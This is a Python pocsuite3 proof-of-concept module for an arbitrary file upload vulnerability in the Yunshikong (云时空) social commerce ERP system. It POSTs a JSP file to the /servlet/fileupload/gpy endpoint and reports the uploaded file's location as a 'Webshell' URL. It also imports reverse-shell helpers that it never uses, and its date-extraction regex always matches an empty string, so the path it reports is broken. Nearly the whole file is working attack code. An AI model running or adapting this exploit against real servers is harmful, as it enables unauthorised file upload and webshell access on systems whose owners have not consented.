# _*_ coding:utf-8 _*_
# @Time : 2023/12/19 19:24
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str
import re

class yunshikong(POCBase):
    pocDesc = '''云时空社会化商业ERP系统任意文件上传漏洞'''
    vulID = '20231219'
    version = '1'
    author = '公众号网络安全透视镜'
    vulDate = '2023-12-19'
    createDate = '2023-12-19'
    updateDate = '2023-12-19'
    name = '云时空社会化商业ERP系统任意文件上传漏洞'
    appName = '云时空'



    def _verify(self):

        result = {}
        url = self.url+ '/servlet/fileupload/gpy'
        files = {
            'file1': ('security.jsp', '<% out.println("This website has a vulnerability"); %>', 'application/octet-stream')
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
        }

        payload = """
                 POST /servlet/fileupload/gpy HTTP/1.1
                 Host: 
                 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
                 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
                 Content-Type: multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A1388
                 Content-Length: 238
                --4eea98d02AEa93f60ea08dE3C18A1388
                Content-Disposition: form-data; name="file1"; filename="check.jsp"
                Content-Type: application/octet-stream
                
                <% out.println("This website has a vulnerability"); %>
                --4eea98d02AEa93f60ea08dE3C18A1388--      
        """
        pattern = r'date=(.*?)'
        try:

            response = requests.post(url, headers=headers, files=files)
            text = response.text
            if response.status_code == 200:
                match = re.search(pattern, text)
                if match:
                    date_value = match.group(1)
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = self.url
                    result['VerifyInfo']['payload'] = payload
                    result['VerifyInfo']['Webshell'] = self.url+"/uploads/pics/"+date_value+"security.jsp"
                else:
                    print("未找到匹配的日期值")


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(yunshikong)